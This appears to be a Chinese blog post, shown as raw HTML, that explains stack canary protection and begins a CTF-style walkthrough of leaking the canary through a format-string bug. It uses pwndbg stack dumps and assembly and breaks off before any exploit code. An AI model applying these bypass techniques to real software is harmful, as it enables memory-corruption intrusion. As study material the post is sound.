

<!DOCTYPE html>
<html lang="zh-CN" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="Ginat_USB">
  <meta name="keywords" content="">
  
    <meta name="description" content="canary保护机制以及解决方法学习参考：https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43713800&#x2F;article&#x2F;details&#x2F;105273284 介绍该词的来源Canary原意为“金丝雀”，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。 安全方面的">
<meta property="og:type" content="article">
<meta property="og:title" content="canary保护机制以及解决方法">
<meta property="og:url" content="http://example.com/2025/02/25/canary%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6%E4%BB%A5%E5%8F%8A%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/index.html">
<meta property="og:site_name" content="Ginat_USB">
<meta property="og:description" content="canary保护机制以及解决方法学习参考：https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_43713800&#x2F;article&#x2F;details&#x2F;105273284 介绍该词的来源Canary原意为“金丝雀”，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。 安全方面的">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2025-02-25T14:13:24.000Z">
<meta property="article:modified_time" content="2025-02-25T14:13:58.115Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="原创">
<meta name="twitter:card" content="summary_large_image">
  
  
  
  <title>canary保护机制以及解决方法 - Ginat_USB</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>Ginat_USB</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>首页</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>归档</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>分类</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>标签</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>关于</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="canary保护机制以及解决方法"></span>
          
        </div>

        
          
  <div class="mt-3">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-author" aria-hidden="true"></i>
        Ginat_USB
      </span>
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-02-25 22:13" pubdate>
          2025年2月25日 晚上
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          4.2k 字
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          36 分钟
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">canary保护机制以及解决方法</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="canary保护机制以及解决方法"><a href="#canary保护机制以及解决方法" class="headerlink" title="canary保护机制以及解决方法"></a>canary保护机制以及解决方法</h1><p>学习参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43713800/article/details/105273284">https://blog.csdn.net/weixin_43713800/article/details/105273284</a></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><h3 id="该词的来源"><a href="#该词的来源" class="headerlink" title="该词的来源"></a>该词的来源</h3><p>Canary原意为“金丝雀”，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。</p>
<h3 id="安全方面的运用"><a href="#安全方面的运用" class="headerlink" title="安全方面的运用"></a>安全方面的运用</h3><p>由上文我们就可以大概才出来，它可以对某种有害操作进行预警，从而终止程序的运行。具体来说，Canary这种保护机制主要针对的是栈溢出漏洞。</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>当启用Canary保护后，它会在栈底之前（不一定紧挨着栈底）插入一个<code>Canary值</code>，一般是是一个随机生成的数字，32位是4字节，64位是8字节。在栈内存中，函数调用时会创建栈帧。栈帧包含了局部变量，返回地址等信息，同时包括Canary值，它被放在栈帧中靠近返回地址和局部变量的位置。在程序正常运行时，Canary值不会改变，但如果发生栈溢出，Canary值可能会改变，程序在关键操作（如函数返回）之前会检查Canary值是否被修改，一旦发现被修改，就会采取安全措施，如终止程序。</p>
<h3 id="在GCC中使用Canary"><a href="#在GCC中使用Canary" class="headerlink" title="在GCC中使用Canary"></a>在GCC中使用Canary</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="hljs-deletion">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="hljs-deletion">-fstack-protector-strong</span><br><span class="hljs-deletion">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="hljs-deletion">-fno-stack-protector 禁用保护</span><br></code></pre></td></tr></table></figure>

<hr>
<p>这些内容过于专业，以我现在的水平看不太懂，先写上，留给以后看</p>
<h3 id="Canary保护栈的原理"><a href="#Canary保护栈的原理" class="headerlink" title="Canary保护栈的原理"></a>Canary保护栈的原理</h3><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">高地址        			  |<span class="hljs-string">					  </span>|<br>						+-------------------+<br>						|<span class="hljs-string">参数				   </span>|<br>						+-------------------+<br>						|<span class="hljs-string">返回地址			  </span>|<br>						+-------------------+<br>			  rbp--&gt;	|<span class="hljs-string">旧的rbp			   </span>|<br>						+-------------------+<br>			rbp-8--&gt;	|<span class="hljs-string">Canary 值		    </span>|<br>						+-------------------+<br>						|<span class="hljs-string">局部变量			  </span>|<br>低地址					  +-------------------+<br></code></pre></td></tr></table></figure>

<p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x4 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov    rax, qword ptr fs:[0x28]<br>mov    qword ptr [rbp - 8], rax<br></code></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">这是对两个陌生名词的解释：<br><br>函数序言：是指是函数在被调用时，首先执行的一段指令序列。它主要用于函数调用的初始化工作，是编译器在生成目标代码时插入到函数开头的部分。主要任务有保存寄存器状态，分配栈空间，设置栈帧指针<br><br><span class="hljs-built_in">fs</span>寄存器：是x86架构下的一个段寄存器，S 寄存器常与通用寄存器如 <span class="hljs-built_in">EAX</span>、<span class="hljs-built_in">EBX</span> 等配合使用，来实现对特定内存位置的数据访问和操作。<br></code></pre></td></tr></table></figure>

<p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov    rdx,QWORD PTR [rbp-0x8]<br>xor    rdx,QWORD PTR fs:0x28<br>je     0x4005d7 &lt;main+65&gt;<br>call   0x400460 &lt;__stack_chk_fail@plt&gt;<br></code></pre></td></tr></table></figure>

<p>如果 Canary 已经被非法修改，此时程序流程会走到 __stack_chk_fail。__stack_chk_fail 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定。定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c">eglibc<span class="hljs-number">-2.19</span>/debug/stack_chk_fail.c<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) __stack_chk_fail (<span class="hljs-type">void</span>)<br>&#123;<br>  __fortify_fail (<span class="hljs-string">&quot;stack smashing detected&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> __attribute__ ((<span class="hljs-keyword">noreturn</span>)) internal_function __fortify_fail (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *msg)<br>&#123;<br>  <span class="hljs-comment">/* The loop is added only to keep gcc happy.  */</span><br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>    __libc_message (<span class="hljs-number">2</span>, <span class="hljs-string">&quot;*** %s ***: %s terminated\n&quot;</span>,<br>                    msg, __libc_argv[<span class="hljs-number">0</span>] ?: <span class="hljs-string">&quot;&lt;unknown&gt;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>但是这也意味着可以通过劫持__stack_chk_fail 的 got 值劫持流程或者利用 __stack_chk_fail 泄漏内容</p>
<p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">void</span> *tcb;        <span class="hljs-comment">/* Pointer to the TCB.  Not necessarily the</span><br><span class="hljs-comment">                       thread descriptor used by libpthread.  */</span><br>  <span class="hljs-type">dtv_t</span> *dtv;<br>  <span class="hljs-type">void</span> *self;       <span class="hljs-comment">/* Pointer to the thread descriptor.  */</span><br>  <span class="hljs-type">int</span> multiple_threads;<br>  <span class="hljs-type">uintptr_t</span> sysinfo;<br>  <span class="hljs-type">uintptr_t</span> stack_guard;<br>  ...<br>&#125; <span class="hljs-type">tcbhead_t</span>;<br></code></pre></td></tr></table></figure>

<p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。<br> 事实上，TLS 中的值由函数 security_init 进行初始化。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">security_init</span> <span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br>  <span class="hljs-comment">// glibc直接使用了_dl_random的值并没有给赋值</span><br>  <span class="hljs-comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span><br><br>  <span class="hljs-comment">//将_dl_random的最后一个字节设置为0x0</span><br>  <span class="hljs-type">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);<br><br>  <span class="hljs-comment">// 设置Canary的值到TLS中</span><br>  THREAD_SET_STACK_GUARD (stack_chk_guard);<br><br>  _dl_random = <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><span class="hljs-comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span><br><span class="hljs-meta">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="绕过Canary保护"><a href="#绕过Canary保护" class="headerlink" title="绕过Canary保护"></a>绕过Canary保护</h2><p>学习参考：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43713800/article/details/105273284">https://blog.csdn.net/weixin_43713800/article/details/105273284</a></p>
<p>​                    <a target="_blank" rel="noopener" href="https://www.yuque.com/cyberangel/rg9gdm/kukf7u">https://www.yuque.com/cyberangel/rg9gdm/kukf7u</a></p>
<hr>
<p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用</p>
<h3 id="泄露栈中的Canary"><a href="#泄露栈中的Canary" class="headerlink" title="泄露栈中的Canary"></a>泄露栈中的Canary</h3><p>Canary值设计以<code>\x00</code>结尾（在最低位），本意是为了保证Canary可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p>
<p>我们接下来用一个实例来演示</p>
<p>先来查一下保护，32位，开启了NX和Canary保护</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">Arch:</span>       <span class="hljs-string">i386-32-little</span><br><span class="hljs-attr">RELRO:</span>      <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><br><span class="hljs-attr">Stack:</span>      <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><br><span class="hljs-attr">NX:</span>         <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br><span class="hljs-attr">PIE:</span>        <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><br><span class="hljs-attr">Stripped:</span>   <span class="hljs-literal">No</span><br><span class="hljs-attr">Debuginfo:</span>  <span class="hljs-literal">Yes</span><br></code></pre></td></tr></table></figure>

<p>运行一下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">❯ ./binary_200<br>44<br>44<br></code></pre></td></tr></table></figure>

<p>我们注意一下<code>main</code>函数的开头和结尾的汇编</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs assembly">+---------------------开头的一部分------------------------+<br>.text:08048561                 push    ebp<br>.text:08048562                 mov     ebp, esp<br>.text:08048564                 and     esp, 0FFFFFFF0h<br>.text:08048567                 sub     esp, 40h<br>.text:0804856A                 mov     eax, large gs:14h   &lt;--<br>.text:08048570                 mov     [esp+3Ch], eax<br>+--------------------结尾的一部分-------------------------+<br>.text:080485E9                 mov     edx, [esp+3Ch]<br>.text:080485ED                 xor     edx, large gs:14h   &lt;--<br>.text:080485F4                 jz      short locret_80485FB<br>.text:080485F6                 call    ___stack_chk_fail<br></code></pre></td></tr></table></figure>

<p>这些汇编命令的出现也印证开启了Canary保护（真是一句废话），gs和fs都是x86的段寄存器，都可以这样用</p>
<p>看一下源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> s[<span class="hljs-number">40</span>]; <span class="hljs-comment">// [esp+14h] [ebp-2Ch] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+3Ch] [ebp-4h]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14u</span>);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>);<br>  gets(s);<br>  <span class="hljs-built_in">printf</span>(s);			&lt;--<br>  gets(s);				&lt;--<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们发现了格式化字符串漏洞，这意味着我们可以泄露栈上的数据，不光有这个，还有危险函数<code>gets</code></p>
<p>同时，我们也发现了完整的后门函数<code>system（&#39;/bin/sh&#39;)</code></p>
<p>这样我们就有了一个大概的思路：</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">待补充<br></code></pre></td></tr></table></figure>

<p>首先，我我们需要找出Canary相对于格式化字符串的偏移，并打印出Canary的值</p>
<p>这是用gdb动调找Canay值的方法</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">───────────────────────────[ STACK ]─────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ <span class="hljs-built_in">esp</span> <span class="hljs-number">0xffffd11c</span> —▸ <span class="hljs-number">0x80485d8</span> (main+<span class="hljs-number">119</span>) ◂— <span class="hljs-keyword">lea</span> <span class="hljs-built_in">eax</span>, [<span class="hljs-built_in">esp</span> + <span class="hljs-number">0x14</span>]<br><span class="hljs-number">01</span>:<span class="hljs-number">0004</span>│-<span class="hljs-number">048</span> <span class="hljs-number">0xffffd120</span> —▸ <span class="hljs-number">0xffffd134</span> ◂— <span class="hljs-string">&#x27;aaaa&#x27;</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">044</span> <span class="hljs-number">0xffffd124</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-number">03</span>:000c│-<span class="hljs-number">040</span> <span class="hljs-number">0xffffd128</span> ◂— <span class="hljs-number">1</span><br><span class="hljs-number">04</span>:<span class="hljs-number">0010</span>│-03c <span class="hljs-number">0xffffd12c</span> ◂— <span class="hljs-number">0</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0014</span>│-<span class="hljs-number">038</span> <span class="hljs-number">0xffffd130</span> —▸ <span class="hljs-number">0xf7fbe4a0</span> —▸ <span class="hljs-number">0xf7d77000</span> ◂— <span class="hljs-number">0x464c457f</span><br><span class="hljs-number">06</span>:<span class="hljs-number">0018</span>│ <span class="hljs-built_in">eax</span> <span class="hljs-number">0xffffd134</span> ◂— <span class="hljs-string">&#x27;aaaa&#x27;</span><br><span class="hljs-number">07</span>:001c│-<span class="hljs-number">030</span> <span class="hljs-number">0xffffd138</span> —▸ <span class="hljs-number">0xf7d8f400</span> ◂— <span class="hljs-number">0x74656700</span><br></code></pre></td></tr></table></figure>

<p>使用<code>x/20wx 0xffffd120</code>命令打印内存中的值</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; x/<span class="hljs-number">20</span>wx <span class="hljs-number">0</span>xffffd120<br><span class="hljs-attribute">0xffffd120</span>:	<span class="hljs-number">0</span>xffffd134	<span class="hljs-number">0</span>x00000000	<span class="hljs-number">0</span>x00000001	<span class="hljs-number">0</span>x00000000<br><span class="hljs-attribute">0xffffd130</span>:	<span class="hljs-number">0</span>xf7fbe4a0	<span class="hljs-number">0</span>x61616161	<span class="hljs-number">0</span>xf7d8f400	<span class="hljs-number">0</span>xf7fbe4a0<br><span class="hljs-attribute">0xffffd140</span>:	<span class="hljs-number">0</span>xffffd180	<span class="hljs-number">0</span>xf7fbe66c	<span class="hljs-number">0</span>xf7fbeb10	<span class="hljs-number">0</span>x00000001<br><span class="hljs-attribute">0xffffd150</span>:	<span class="hljs-number">0</span>x00000001	<span class="hljs-number">0</span>x00000000	<span class="hljs-number">0</span>xf7fa1000	<span class="hljs-number">0</span>x2b539700<br><span class="hljs-attribute">0xffffd160</span>:	<span class="hljs-number">0</span>xffffd3eb	<span class="hljs-number">0</span>x00000070	<span class="hljs-number">0</span>xf7ffd020	<span class="hljs-number">0</span>xf7d98519<br></code></pre></td></tr></table></figure>

<p>其中<code>0xffffd134</code>是个储存格式化字符串内存的地址，从这个之后开始数，发现<code>0x61616161</code>是第五个，所以我们确定格式化字符串的偏移量为5</p>
<p>然后我们在<code>xor</code>处下断点，因为启用Canary保护之后，汇编代码中一个函数的开头和结尾都会出现<code>xor</code>即异或操作，所以在这里下断点。因为<code>xor</code>是汇编命令，不是函数，所以我们需要知道它的地址，在gdb中，先使用<code>finish</code>步出<code>printf</code>函数（下断点后运行，中断时一般自动步入该函数），再使用<code>disassemble</code>命令显示反汇编，查看其地址。或者使用<code>finish</code>步出后，看看反汇编窗口有没有<code>xor</code>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs assembly">  0x80485d8 &lt;main+119&gt;    lea    eax, [esp + 0x14]        EAX =&gt; 0xffffd134 ◂— &#x27;aaaa&#x27;<br>  0x80485dc &lt;main+123&gt;    mov    dword ptr [esp], eax     [0xffffd120] &lt;= 0xffffd134 ◂— &#x27;aaaa&#x27;<br>  0x80485df &lt;main+126&gt;    call   gets@plt                    &lt;gets@plt&gt;<br><br>  0x80485e4 &lt;main+131&gt;    mov    eax, 0                          EAX =&gt; 0<br>  0x80485e9 &lt;main+136&gt;    mov    edx, dword ptr [esp + 0x3c]<br>► 0x80485ed &lt;main+140&gt;    xor    edx, dword ptr gs:[0x14]        EDX =&gt; 0x2b539700 ^ 0x2b539700<br>  0x80485f4 &lt;main+147&gt;    je     main+154                    &lt;main+154&gt;<br><br>  0x80485f6 &lt;main+149&gt;    call   __stack_chk_fail@plt        &lt;__stack_chk_fail@plt&gt;<br><br>  0x80485fb &lt;main+154&gt;    leave  <br>  0x80485fc &lt;main+155&gt;    ret    <br><br>  0x80485fd               nop    <br></code></pre></td></tr></table></figure>

<p>我们可以看到，Canary的值储存在了edx寄存器中，因为再函数开头的Canary保护相应汇编指令中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.text:0804856A                 mov     eax, large gs:14h   &lt;--<br>.text:08048570                 mov     [esp+3Ch], eax		&lt;--<br></code></pre></td></tr></table></figure>

<p>我们得知<code>[esp+3Ch]</code>是存放Canary的随即参数</p>
<p>我们查看寄存器的值</p>
